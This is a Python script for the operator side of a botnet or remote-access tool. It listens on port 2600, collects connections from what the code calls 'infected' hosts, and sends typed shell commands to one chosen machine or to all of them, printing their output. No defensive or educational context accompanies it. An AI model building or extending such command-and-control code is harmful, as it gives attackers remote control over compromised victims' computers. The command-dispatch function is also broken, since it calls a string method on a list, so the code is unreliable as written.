import socket
import select
import sys

def server():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind(("0.0.0.0", 2600))
    soc.listen(1)
    server_list = [soc, sys.stdin]
    print("Server is ready and listening")
    print("waiting for connection")
    while True:
        r_sock, w_sock, x_sock = select.select(server_list, [], [])
        for elem in r_sock:
            if elem == soc:
                (clientsocket, addressguest) = soc.accept()
                print(f"Connection from {addressguest}")
                if not clientsocket in server_list:
                    server_list.append(clientsocket)
            elif elem == sys.stdin:
                command = sys.stdin.readline()
                send_message(command, server_list)
                
            else:
                new_data = elem.recv(4096).decode('cp850', errors='replace')
                data_name = elem.getpeername()
                if new_data:
                    
                    
                    print(f"\n[answer from {data_name}] :\n {new_data}")
                else:
                    print(f"connection lost with {data_name}")
                    server_list.remove(elem)
                    elem.close()
                

    soc.close()
    return



def send_message(message, infected_list):
    message = message.split(" ")
    target = message[0]
    final_mess = " ".join(message[1:])
    parts = message.strip().split(" ", 1)
    
    
    if len(parts) < 2:
        print("[!] Format : <IP ou *> <commande>")
        return 0
        
    target = parts[0]
    final_mess = parts[1] + "\n"
    
    
    for cible in infected_list:
        if cible != infected_list[0] and cible != sys.stdin:
            try:
                ip_cible = cible.getpeername()[0]
                
                if target == "*" or target == ip_cible:
                    cible.send(final_mess.encode("utf-8"))
                    
                    if target != "*":
                        break 
            except Exception as e:
                pass
                
    return 1




















server()